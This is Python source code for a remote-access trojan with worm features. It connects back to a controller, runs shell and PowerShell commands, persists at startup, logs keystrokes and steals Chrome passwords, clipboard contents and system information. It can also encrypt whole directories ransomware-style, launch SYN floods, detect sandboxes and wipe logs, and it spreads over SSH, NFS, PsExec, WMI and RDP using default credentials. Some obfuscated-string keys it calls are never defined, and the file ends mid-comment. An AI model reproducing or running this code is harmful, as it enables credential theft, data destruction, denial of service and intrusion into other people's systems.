import socket
import sys
import os
import json
import subprocess
import time
import base64
import threading
import random
import hashlib
from queue import Queue
import paramiko
from pynput import keyboard
import requests
from scapy.all import IP, TCP, sendp, ARP, Ether, srp
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import ctypes
import platform
import shutil
import sqlite3
import uuid
import re
import psutil
from Crypto.Protocol.KDF import PBKDF2
from win32crypt import CryptUnprotectData
import pyperclip
import netifaces
import wmi
import win32net
import win32api
import pythoncom

# AES Encryption/Decryption Functions
def encrypt(data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_data = cipher.encrypt(pad(data, AES.block_size))
    return base64.b64encode(encrypted_data)

def decrypt(encrypted_data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(base64.b64decode(encrypted_data)), AES.block_size)
    return decrypted_data

# AES Key and IV
AES_KEY = b'ThisIsA32ByteIVForAES256Encrypt!'
AES_IV = b'ThisIsA16ByteIV!'

keylogger_listener = None
exit_requested = False
syn_flood_threads = []
stop_syn_flood_flag = threading.Event()

def aes_encrypt_string(s, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_data = cipher.encrypt(pad(s.encode(), AES.block_size))
    return base64.b64encode(encrypted_data).decode()

def aes_decrypt_string(s, key, iv):
    encrypted_data = base64.b64decode(s.encode())
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
    return decrypted_data.decode()

# Obfuscate sensitive strings
obf_strings = {
    "powershell": aes_encrypt_string("powershell", AES_KEY, AES_IV),
    "no_profile": aes_encrypt_string("-NoProfile", AES_KEY, AES_IV),
    "execution_policy": aes_encrypt_string("-ExecutionPolicy", AES_KEY, AES_IV),
    "bypass": aes_encrypt_string("Bypass", AES_KEY, AES_IV),
    "command": aes_encrypt_string("-Command", AES_KEY, AES_IV),
    "shutdown_r": aes_encrypt_string("shutdown /r /t 0", AES_KEY, AES_IV),
    "shutdown_s": aes_encrypt_string("shutdown /s /t 0", AES_KEY, AES_IV),
    "sudo_reboot": aes_encrypt_string("sudo reboot", AES_KEY, AES_IV),
    "sudo_shutdown": aes_encrypt_string("sudo shutdown now", AES_KEY, AES_IV),
    "keylogs_txt": aes_encrypt_string('keylogs.txt', AES_KEY, AES_IV),
    "appdata": aes_encrypt_string(os.environ['APPDATA'], AES_KEY, AES_IV),
    "open_bat": aes_encrypt_string('open.bat', AES_KEY, AES_IV),
    "error": aes_encrypt_string("Error", AES_KEY, AES_IV),
    "keylogger_started": aes_encrypt_string("Keylogger started.", AES_KEY, AES_IV),
    "keylogger_running": aes_encrypt_string("Keylogger is already running.", AES_KEY, AES_IV),
    "keylogger_stopped": aes_encrypt_string("Keylogger stopped.", AES_KEY, AES_IV),
    "keylogger_not_running": aes_encrypt_string("Keylogger is not running.", AES_KEY, AES_IV),
    "dir_path_missing_encrypt": aes_encrypt_string("Directory path missing for encrypt_dir command.", AES_KEY, AES_IV),
    "dir_path_missing_decrypt": aes_encrypt_string("Directory path missing for decrypt_dir command.", AES_KEY, AES_IV),
    "target_ip_port_missing": aes_encrypt_string("Target IP or port missing for syn_flood command.", AES_KEY, AES_IV),
    "invalid_command": aes_encrypt_string("Invalid command received", AES_KEY, AES_IV),
    "running_as_admin": aes_encrypt_string("Running with administrative privileges.", AES_KEY, AES_IV),
    "running_as_user": aes_encrypt_string("Running with user privileges.", AES_KEY, AES_IV),
    "scanning_network": aes_encrypt_string("Scanning network...", AES_KEY, AES_IV),
    "host_found": aes_encrypt_string("Host found: ", AES_KEY, AES_IV),
    "no_targets_found": aes_encrypt_string("No targets found.", AES_KEY, AES_IV),
    "targets_found": aes_encrypt_string("Targets found: ", AES_KEY, AES_IV),
    "echo_polymorphic": aes_encrypt_string('echo Polymorphic', AES_KEY, AES_IV),
    "self_destructed": aes_encrypt_string("Self-destructed: ", AES_KEY, AES_IV),
    "failed_to_self_destruct": aes_encrypt_string("Failed to self-destruct: ", AES_KEY, AES_IV),
    "sandbox_detected": aes_encrypt_string("Sandbox detected", AES_KEY, AES_IV),
    "attempting_rdp_exploit": aes_encrypt_string("Attempting RDP exploit on", AES_KEY, AES_IV),
    "rdp_exploit_executed": aes_encrypt_string("RDP exploit executed on", AES_KEY, AES_IV),
    "error_in_rdp_exploit": aes_encrypt_string("Error in RDP exploit on", AES_KEY, AES_IV),
    "attempting_http_exploit": aes_encrypt_string("Attempting HTTP exploit on", AES_KEY, AES_IV),
    "http_exploit_succeeded": aes_encrypt_string("HTTP exploit succeeded on", AES_KEY, AES_IV),
    "error_in_http_exploit": aes_encrypt_string("Error in HTTP exploit on", AES_KEY, AES_IV),
    "attempting_smb_exploit": aes_encrypt_string("Attempting SMB exploit on", AES_KEY, AES_IV),
    "smb_exploit_succeeded": aes_encrypt_string("SMB exploit succeeded on", AES_KEY, AES_IV),
    "error_in_smb_exploit": aes_encrypt_string("Error in SMB exploit on", AES_KEY, AES_IV)
}

def server(ip, port):
    global connection 
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connection.connect((ip, port))
            break
        except socket.error:
            time.sleep(5)

def send(data):
    try:
        json_data = json.dumps(data)
        encrypted_data = encrypt(json_data.encode('utf-8'), AES_KEY, AES_IV)
        connection.send(encrypted_data)
    except Exception as e:
        print(f"Send error: {e}")

def receive():
    encrypted_data = b''
    while True:
        try:
            encrypted_data += connection.recv(1024)
            return json.loads(decrypt(encrypted_data, AES_KEY, AES_IV).decode('utf-8'))
        except ValueError:
            continue
        except Exception as e:
            print(f"Receive error: {e}")
            return None

def add_to_startup(file_path=""):
    try:
        if file_path == "":
            file_path = os.path.abspath(sys.argv[0])
        bat_path = os.path.join(aes_decrypt_string(obf_strings["appdata"], AES_KEY, AES_IV), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        with open(os.path.join(bat_path, aes_decrypt_string(obf_strings["open_bat"], AES_KEY, AES_IV)), "w+", encoding="utf-8") as bat_file:
            bat_file.write(f'start "" "{file_path}"')
    except Exception as e:
        send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}")

def start_keylogger():
    global keylogger_listener

    def on_press(key):
        log_var = 'log_' + str(uuid.uuid4()).replace('-', '')
        globals()[log_var] = ''
        try:
            globals()[log_var] = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                globals()[log_var] = ' '
            elif key == keyboard.Key.enter:
                globals()[log_var] = '\n'
            elif key in (keyboard.Key.tab, keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.caps_lock):
                globals()[log_var] = ''

        try:
            with open(os.path.join(aes_decrypt_string(obf_strings["appdata"], AES_KEY, AES_IV), aes_decrypt_string(obf_strings["keylogs_txt"], AES_KEY, AES_IV)), 'a') as log_file:
                log_file.write(globals()[log_var])
        except Exception as e:
            send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}")

    if keylogger_listener is None:
        try:
            keylogger_listener = keyboard.Listener(on_press=on_press)
            keylogger_listener.start()
            return keylogger_listener
        except Exception as e:
            send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}")
            return None
    return keylogger_listener

def stop_keylogger():
    global keylogger_listener
    if keylogger_listener:
        try:
            keylogger_listener.stop()
            keylogger_listener = None
            return True
        except Exception as e:
            send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}")
            return False
    return False

def build_powershell_command(command):
    return [aes_decrypt_string(obf_strings["powershell"], AES_KEY, AES_IV), aes_decrypt_string(obf_strings["no_profile"], AES_KEY, AES_IV), aes_decrypt_string(obf_strings["execution_policy"], AES_KEY, AES_IV), aes_decrypt_string(obf_strings["bypass"], AES_KEY, AES_IV), aes_decrypt_string(obf_strings["command"], AES_KEY, AES_IV), command]

def run_powershell(command):
    try:
        ps_command = build_powershell_command(command)
        process = subprocess.run(ps_command, capture_output=True, text=True)
        result = process.stdout.strip()
        error = process.stderr.strip()

        if process.returncode != 0:
            send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {error}")
            return f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {error}"
        else:
            return result
    except Exception as e:
        send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}")
        return f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}"

def run_command(command):
    try:
        if command.startswith(aes_decrypt_string(obf_strings["powershell"], AES_KEY, AES_IV)):
            return run_powershell(command[len(aes_decrypt_string(obf_strings["powershell"], AES_KEY, AES_IV)):].strip())
        else:
            process = subprocess.run(command, shell=True, capture_output=True, text=True)
            result = process.stdout.strip()
            error = process.stderr.strip()

            if process.returncode != 0:
                send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {error}")
                return f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {error}"
            else:
                return result
    except Exception as e:
        send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}")
        return f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}"

def syn_flood(target_ip, target_port):
    def flood():
        while not stop_syn_flood_flag.is_set():
            packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
            sendp(packet, verbose=False)
    
    flood_thread = threading.Thread(target=flood)
    syn_flood_threads.append(flood_thread)
    flood_thread.start()

def stop_syn_flood():
    stop_syn_flood_flag.set()
    for thread in syn_flood_threads:
        thread.join()
    syn_flood_threads.clear()
    stop_syn_flood_flag.clear()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def request_admin_privileges():
    if not is_admin():
        if platform.system() == "Windows":
            try:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            except Exception as e:
                print(f"Failed to request administrative privileges: {e}")
                return False
        return False
    return True

def get_decryption_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'],
                                    "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        if password.startswith(b'v10') or password.startswith(b'v11'):
            iv = password[3:15]
            encrypted_password = password[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(encrypted_password)
            return decrypted_pass.decode()
        else:
            return CryptUnprotectData(password, None, None, None, 0)[1].decode()
    except Exception as e:
        return f"Error decrypting password: {e}"

def extract_browser_passwords():
    key = get_decryption_key()
    credentials = []
    profiles = ["Default", "Profile 1", "Profile 2", "Profile 3"]
    base_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data')
    
    for profile in profiles:
        login_db_path = os.path.join(base_path, profile, 'Login Data')
        if os.path.exists(login_db_path):
            shutil.copy2(login_db_path, "Login Data.db")
            conn = sqlite3.connect("Login Data.db")
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                origin_url = row[0]
                username = row[1]
                encrypted_password = row[2]
                decrypted_password = decrypt_password(encrypted_password, key)
                credentials.append({
                    "profile": profile,
                    "url": origin_url,
                    "username": username,
                    "password": decrypted_password
                })
            cursor.close()
            conn.close()
            os.remove("Login Data.db")
    return credentials

def capture_clipboard():
    try:
        clipboard_content = pyperclip.paste()
    except Exception as e:
        return f"Error capturing clipboard content: {e}"
    return clipboard_content

def steal_system_info():
    try:
        info = {}
        info['platform'] = platform.system()
        info['platform-release'] = platform.release()
        info['platform-version'] = platform.version()
        info['architecture'] = platform.machine()
        info['hostname'] = socket.gethostname()
        info['ip-address'] = socket.gethostbyname(socket.gethostname())
        info['mac-address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        info['processor'] = platform.processor()
        info['ram'] = str(round(psutil.virtual_memory().total / (1024.0 **3))) + " GB"

        try:
            response = requests.get('https://api.ipify.org?format=json')
            global_ip = response.json()['ip']
            info['global-ip-address'] = global_ip
        except Exception as e:
            info['global-ip-address'] = "Could not fetch global IP address"
            send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}")

        return info
    except Exception as e:
        send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}")
        return {}

def get_network_info():
    network_info = {}
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        ifaddresses = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in ifaddresses:
            ipv4_info = ifaddresses[netifaces.AF_INET][0]
            mac_address = ifaddresses[netifaces.AF_LINK][0]['addr']
            network_info[interface] = {
                "ipv4": ipv4_info.get('addr'),
                "netmask": ipv4_info.get('netmask'),
                "mac_address": mac_address
            }
    return network_info

def encrypt_file(file_path, key, iv):
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        with open(file_path, 'rb') as f:
            with open(file_path + ".enc", 'wb') as wf:
                while chunk := f.read(64 * 1024):  # Read in 64kB chunks
                    encrypted_chunk = cipher.encrypt(pad(chunk, AES.block_size))
                    wf.write(encrypted_chunk)
        os.remove(file_path)
        os.rename(file_path + ".enc", file_path)
        return True
    except Exception as e:
        print(f"Failed to encrypt {file_path}: {e}")
        return False

def decrypt_file(file_path, key, iv):
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        with open(file_path, 'rb') as f:
            with open(file_path + ".dec", 'wb') as wf:
                while chunk := f.read(64 * 1024):  # Read in 64kB chunks
                    decrypted_chunk = unpad(cipher.decrypt(chunk), AES.block_size)
                    wf.write(decrypted_chunk)
        os.remove(file_path)
        os.rename(file_path + ".dec", file_path)
        return True
    except Exception as e:
        print(f"Failed to decrypt {file_path}: {e}")
        return False

def encrypt_directory(directory, key, iv):
    total_files = sum([len(files) for r, d, files in os.walk(directory)])
    encrypted_files = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if encrypt_file(file_path, key, iv):
                encrypted_files += 1
            if encrypted_files % 10 == 0 or encrypted_files == total_files:  # Report progress every 10 files or at the end
                send({"progress": f"Progress: {encrypted_files}/{total_files} files encrypted"})
            time.sleep(0.01)  # Sleep to reduce CPU load
    send({"message": "Encryption completed"})

def decrypt_directory(directory, key, iv):
    total_files = sum([len(files) for r, d, files in os.walk(directory)])
    decrypted_files = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if decrypt_file(file_path, key, iv):
                decrypted_files += 1
            if decrypted_files % 10 == 0 or decrypted_files == total_files:  # Report progress every 10 files or at the end
                send({"progress": f"Progress: {decrypted_files}/{total_files} files decrypted"})
            time.sleep(0.01)  # Sleep to reduce CPU load
    send({"message": "Decryption completed"})

def reboot_system():
    try:
        if platform.system() == "Windows":
            os.system(aes_decrypt_string(obf_strings["shutdown_r"], AES_KEY, AES_IV))
        elif platform.system() in ["Linux", "Darwin"]:
            os.system(aes_decrypt_string(obf_strings["sudo_reboot"], AES_KEY, AES_IV))
        return aes_decrypt_string(obf_strings["system_rebooting"], AES_KEY, AES_IV)
    except Exception as e:
        send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}")
        return f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}"

def turn_off_system():
    try:
        if platform.system() == "Windows":
            os.system(aes_decrypt_string(obf_strings["shutdown_s"], AES_KEY, AES_IV))
        elif platform.system() in ["Linux", "Darwin"]:
            os.system(aes_decrypt_string(obf_strings["sudo_shutdown"], AES_KEY, AES_IV))
        return aes_decrypt_string(obf_strings["system_shutting_down"], AES_KEY, AES_IV)
    except Exception as e:
        send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}")
        return f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}"

def polymorphic_code():
    try:
        polymorphic_funcs_var = 'funcs_' + str(uuid.uuid4()).replace('-', '')
        globals()[polymorphic_funcs_var] = [
            lambda: time.sleep(random.uniform(0.5, 2)),
            lambda: print("Polymorphic function executed." if random.random() > 0.5 else "Running polymorphic code..."),
            lambda: sum([random.randint(0, 10) for _ in range(random.randint(100, 1000))]),
            lambda: os.system(aes_decrypt_string(obf_strings["echo_polymorphic"], AES_KEY, AES_IV)),
            lambda: hashlib.sha256(b"polymorphic").hexdigest(),
            lambda: dynamic_import('zlib')
        ]
        random.choice(globals()[polymorphic_funcs_var])()
    except Exception as e:
        send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}")

def dynamic_import(module_name):
    try:
        module = __import__(module_name)
        globals()[module_name] = module
    except Exception as e:
        send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}")

def anti_forensics():
    try:
        if platform.system() == "Windows":
            os.system(aes_decrypt_string(obf_strings["cl_system"], AES_KEY, AES_IV))
            os.system(aes_decrypt_string(obf_strings["cl_application"], AES_KEY, AES_IV))
            os.system(aes_decrypt_string(obf_strings["cl_security"], AES_KEY, AES_IV))
        elif platform.system() == "Linux":
            os.system(aes_decrypt_string(obf_strings["shred_u_var_log"], AES_KEY, AES_IV))
        return True
    except Exception as e:
        send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}")
        return False

def is_sandbox():
    sandbox_artifacts = [
        'SbieDll.dll', 'VBoxService.exe', 'vmware.exe', 'vmtoolsd.exe', 
        'vboxtray.exe', 'prl_cc.exe', 'prl_tools.exe', 'xenservice.exe',
        'qemu-ga.exe', 'xenstore.exe'
    ]
    
    sandbox_files = [
        r'C:\windows\sysnative\drivers\vmtray.dll', r'C:\windows\system32\drivers\Vmmouse.sys',
        r'C:\windows\system32\drivers\vm3dmp.sys', r'C:\windows\system32\drivers\vpc-s3.sys',
        r'C:\windows\system32\drivers\vpcuhub.sys', r'C:\windows\system32\drivers\vpcusb.sys'
    ]
    
    sandbox_registry_keys = [
        r'HKEY_LOCAL_MACHINE\SOFTWARE\Oracle\VirtualBox Guest Additions',
        r'HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMware Tools',
        r'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters'
    ]

    for artifact in sandbox_artifacts:
        if artifact in (p.name() for p in psutil.process_iter()):
            return True

    for file in sandbox_files:
        if os.path.exists(file):
            return True

    if platform.system() == 'Windows':
        import winreg
        for key in sandbox_registry_keys:
            try:
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
                return True
            except FileNotFoundError:
                continue
    
    if psutil.cpu_count() <= 2 or psutil.virtual_memory().total <= 2 * 1024 * 1024 * 1024:
        return True

    return False

def generate_worm_code():
    return '''import os 

def payload():
        home_dir = os.path.expanduser('~')
        infected_file = os.path.join(home_dir, 'infected.txt')
        with open(infected_file, 'w') as f:
            f.write("This system has been infected.")
        print("Payload executed: infected.txt created.")
    
def main():
     payload()

if __name__ == '__main__':
     main()
'''

def spread_ssh(target_ip):
    try:
        print(f"Attempting SSH exploit on {target_ip}")
        username = 'kali'
        passwords = ['12345', '1234']
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        worm_code = generate_worm_code()
        for password in passwords:
            try:
                client.connect(target_ip, username=username, password=password)

                sftp = client.open_sftp()
                with sftp.file('/tmp/worm.py', 'w') as f:
                    f.write(worm_code)
                sftp.close()

                stdin, stdout, stderr = client.exec_command('python3 /tmp/worm.py')
                stdout_output = stdout.read().decode()
                stderr_output = stderr.read().decode()
                print(f'SSH exploit succeed on {target_ip} with password {password}')
                print(f'STDOUT: {stdout_output}')
                if stderr_output:
                    print(f'STDERR: {stderr_output}')

                stdin, stdout, stderr = client.exec_command('echo $HOME')
                home_dir = stdout.read().decode().strip()
                infected_file = f'{home_dir}/infected.txt'

                sftp = client.open_sftp()
                try:
                    sftp.stat(infected_file)
                    print(f'{infected_file} exsits on {target_ip}')
                except FileNotFoundError:
                    print(f'{infected_file} does not exsists on {target_ip}')
                sftp.close()
                break
            except paramiko.AuthenticationException:
                continue
    except Exception as e:
        print(f"Error in SSH exploit: {e}")

def nfs_spread(target_ip):
    try:
        print(f'Attempting NFS exploit on {target_ip}')
        os.system(f'showmount -e {target_ip}')
        os.system(f'mount -t nfs {target_ip}:/export /mnt')
        payload = generate_worm_code()
        with open('/mnt/worm.py', 'w') as f:
            f.write(payload)
        os.sytem('umount /mnt')
        print(f"NFS exploit succeeded on {target_ip}")
    except Exception as e:
        print(f"Error in NFS exploit: {e}")

def psexec_lateral_movement(target_ip, username, password):
    try:
        print(f'Attempting PsExec lateral movement on {target_ip}')
        payload = generate_worm_code()
        with open('worm.bat', 'w') as f:
            f.write(payload)
        os.system(f'psexec \\\\{target_ip} -u {username} -p {password} -c worm.py')
        print(f"PsExec lateral movement suceeded on {target_ip}")
    except Exception as e:
        print(f'Error in PsExec exploit: {e}')

def wmi_lateral_movement(target_ip, username, password):
    try:
        print(f'Attempting WMI lateral movemnt on {target_ip}')
        pythoncom.CoInitialize()
        connection = wmi.WMI(target_ip, user=username, password=password)
        process_startup = connection.Win32_ProcessStartup.new()
        process_id, result = connection.Win32_Process.Create(
            CommandLine = 'cmd.exe /c "echo This system is infected. > infected.txt"',
            ProcessStartupInformation =process_startup
        )
        if result == 0:
            print(f'WMI lateral movement succeeded on {target_ip}, process ID: {process_id}')
        else:
            print(f'WMI lateral movemnt failed on {target_ip}, error code: {result}')
    except Exception as e:
        print(f'Error in WMI leteral movemnt: {e}')

def spread_rdp(target_ip):
    try:
        print(f"Attempting RDP exploit on {target_ip}")

        powershell_script = '''
        $path = 'C:\\infected.txt';
        $content = 'This system is infected.';
        New-Item -Path $path -ItemType 'file' -Value $content;
        '''

        encoded_script = base64.b64encode(powershell_script.encode('utf-16le')).decode()

        payload = f'''
        powershell -EncodedCommand {encoded_script}
        '''

        username = 'admin'
        password = 'admin'

        os.system(f'cmdkey /generic:TERMSRV/{target_ip} /user:{username} /pass:{password}')
        os.system(f'mstsc /v:{target_ip} /admin /f')
        os.system(f'psexec \\\\{target_ip} -u {username} -p {password} {payload}')

        print(f'RDP exploit executed on {target_ip}')
    except Exception as e:
        print(f'Error in RDP exploit: {e}')

def scan_network(ip_range):
    alive_hosts = []

    arp = ARP(pdst=ip_range)
    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
    packet = ether/arp

    result = srp(packet, timeout=2, verbose=0)[0]

    for sent, received in result:
        alive_hosts.append(received.psrc)
    
    return alive_hosts

def spread(target_ip):
    threading.Thread(target=spread_ssh, args=(target_ip,)).start()
    threading.Thread(target=nfs_spread, args=(target_ip,)).start()
    threading.Thread(target=psexec_lateral_movement, args=(target_ip, 'admin', 'admin')).start()
    threading.Thread(target=wmi_lateral_movement, args=(target_ip, 'admin', 'admin')).start()
    threading.Thread(target=spread_rdp, args=(target_ip,)).start()

def spread_to_network(ip_range):
    alive_hosts = scan_network(ip_range)
    for host in alive_hosts:
        spread(host)

# Port scanning functions
def scan_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            try:
                service = socket.getservbyport(port)
            except:
                service = "Unknown"
            
            # Try to grab the banner
            try:
                sock.send(b'HEAD / HTTP/1.1\r\n\r\n')
                banner = sock.recv(1024).decode().strip()
            except:
                banner = "No banner"
            
            return port, service, banner, True
        else:
            return port, "Unknown", "", False
    except Exception as e:
        return port, "Error", str(e), False
    finally:
        sock.close()

def threader(ip, queue, results):
    while True:
        port = queue.get()
        if port is None:
            break
        result = scan_port(ip, port)
        results.append(result)
        queue.task_done()

def advanced_port_scan(ip, start_port, end_port, num_threads=100):
    queue = Queue()
    results = []

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=threader, args=(ip, queue, results))
        thread.start()
        threads.append(thread)

    for port in range(start_port, end_port + 1):
        queue.put(port)

    queue.join()

    for _ in range(num_threads):
        queue.put(None)
    for thread in threads:
        thread.join()

    return results

RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

def format_port_results(results):
    formatted_results = "Port Scan Results:\n"
    formatted_results += "{:<8} {:<15} {:<10}\n".format("Port", "Service", "Status")
    formatted_results += "-" * 85 + "\n"
    for port, service, banner, status in results:
        if status:  # Only include open ports
            formatted_results += f"{RED}{port:<8} {service:<15} {'Open':<10}{RESET}\n"
            banner_lines = banner.split('\n')
            for line in banner_lines:
                formatted_results += f"{GREEN}{'':<8}{line}{RESET}\n"
    return formatted_results

def scan(ip):
    try:
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
        packet = broadcast / arp_request
        answer = srp(packet, timeout=1, verbose=False)[0]

        clients = []
        for element in answer:
            client = {'IP': element[1].psrc, 'MAC': element[1].hwsrc}
            try:
                hostname = socket.gethostbyaddr(client['IP'])[0]
                client['Hostname'] = hostname
            except socket.herror:
                client['Hostname'] = 'Unknown'
            clients.append(client)
        return clients
    except Exception as e:
        send(f"Error: {e}")
        return [] 

def format_scan_results(clients):
    formatted_results = "Scan Results:\n"
    formatted_results += "{:<15} {:<20} {:<30}\n".format("IP Address", "MAC Address", "Hostname")
    formatted_results += "-"*65 + "\n"
    for client in clients:
        formatted_results += "{:<15} {:<20} {:<30}\n".format(client['IP'], client['MAC'], client['Hostname'])
    return formatted_results

def run():
    global exit_requested, keylogger_listener
    add_to_startup()
    while not exit_requested:
        polymorphic_code()  # Call the polymorphic function
        try:
            command = receive()
            if command is None:
                continue
            polymorphic_code()
            if command == 'exit':
                exit_requested = True
            elif command == 'check_priv':
                if is_admin():
                    send(aes_decrypt_string(obf_strings["running_as_admin"], AES_KEY, AES_IV))
                else:
                    send(aes_decrypt_string(obf_strings["running_as_user"], AES_KEY, AES_IV))
            elif command[:2] == 'cd' and len(command) > 1:
                try:
                    os.chdir(command[3:])
                    send(f"Changed directory to: {os.getcwd()}")
                except FileNotFoundError:
                    send(f"Directory not found: {command[3:]}")
                except Exception as e:
                    send(str(e))
            elif command.startswith('download'):
                file_path = command[9:]
                if os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        file_data = base64.b64encode(f.read()).decode('utf-8')
                        send({"file_data": file_data})
                else:
                    send({"error": "File does not exist"})
            elif command.startswith('upload'):
                file_data = receive()
                try:
                    with open(file_data['file_name'], 'wb') as f:
                        f.write(base64.b64decode(file_data['file_data']))
                    send("File uploaded successfully.")
                except Exception as e:
                    send(f"Error saving uploaded file: {e}")
            elif command == 'start_keylogger':
                if keylogger_listener is None:
                    keylogger_listener = start_keylogger()
                    if keylogger_listener:
                        send(aes_decrypt_string(obf_strings["keylogger_started"], AES_KEY, AES_IV))
                    else:
                        send(aes_decrypt_string(obf_strings["error"], AES_KEY, AES_IV))
                else:
                    send(aes_decrypt_string(obf_strings["keylogger_running"], AES_KEY, AES_IV))
            elif command == 'stop_keylogger':
                if keylogger_listener is not None:
                    if stop_keylogger():
                        keylogger_listener = None
                        send(aes_decrypt_string(obf_strings["keylogger_stopped"], AES_KEY, AES_IV))
                    else:
                        send(aes_decrypt_string(obf_strings["error"], AES_KEY, AES_IV))
                else:
                    send(aes_decrypt_string(obf_strings["keylogger_not_running"], AES_KEY, AES_IV))
            elif command.startswith('encrypt_dir'):
                directory = command.split()[1]
                send(f"Encrypting directory: {directory}")
                threading.Thread(target=encrypt_directory, args=(directory, AES_KEY, AES_IV)).start()
            elif command.startswith('decrypt_dir'):
                directory = command.split()[1]
                send(f"Decrypting directory: {directory}")
                threading.Thread(target=decrypt_directory, args=(directory, AES_KEY, AES_IV)).start()
            elif command.startswith('syn_flood'):
                target_ip, target_port = command.split()[1], int(command.split()[2])
                send(f"Starting SYN flood attack on {target_ip}:{target_port}")
                threading.Thread(target=syn_flood, args=(target_ip, target_port)).start()
            elif command == 'stop_syn_flood':
                send("Stopping SYN flood attack")
                stop_syn_flood()
            elif command == 'steal_creds':
                creds = extract_browser_passwords()
                send({"message": "Extracted browser credentials", "credentials": creds})
            elif command == 'steal_clipboard':
                clipboard_content = capture_clipboard()
                send({"message": "Captured clipboard content", "clipboard": clipboard_content})
            elif command == 'steal_info':
                info = steal_system_info()
                send({"message": "Stolen system information", "info": info})
            elif command == 'network_info':
                network_info = get_network_info()
                send({"message": "Extracted network information", "network_info": network_info})
            elif command.startswith('port_scan'):
                _, target_ip, start_port, end_port = command.split()
                start_port, end_port = int(start_port), int(end_port)
                scan_results = advanced_port_scan(target_ip, start_port, end_port)
                formatted_results = format_port_results(scan_results)
                send(formatted_results)
            elif command == 'reboot':
                send("Rebooting target system...")
                reboot_system()
            elif command == 'turn_off':
                send("Turning off target system...")
                turn_off_system()
            elif command == 'anti_forensics':
                send("Deleting logs from target computer...")
                anti_forensics()
            elif command.startswith('spread '):
                ip_range = command.split(' ')[1]
                spread_to_network(ip_range)
            elif command.startswith('scan_network'):
                ip_range = command.split()[1]
                clients = scan(ip_range)
                formatted_results = format_scan_results(clients)
                send(formatted_results)
            else:
                try:
                    result = run_command(command)
                    send(result)
                except Exception as e:
                    send(str(e))
        except KeyboardInterrupt:
            break
        except Exception as e:
            send(f"Error: {str(e)}")

import winreg as reg

# def add_to_registry():
#     try:
#         file_path = os.path.abspath(sys.argv[0])
#         key = reg.HKEY_CURRENT_USER
#         key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        
#         open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
